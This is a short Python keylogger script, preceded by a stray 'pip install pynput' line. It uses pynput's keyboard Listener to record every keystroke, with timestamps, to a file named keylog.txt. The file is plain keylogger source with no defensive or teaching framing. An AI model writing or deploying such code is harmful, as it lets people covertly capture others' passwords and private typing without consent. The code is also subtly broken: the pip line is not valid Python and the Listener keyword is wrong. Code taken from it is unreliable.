pip install pynput
import logging

from pynput.keyboard import Listener

logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")


def press(key):
    logging.info(str(key))


with Listener(press=press) as listener:
    listener.join()
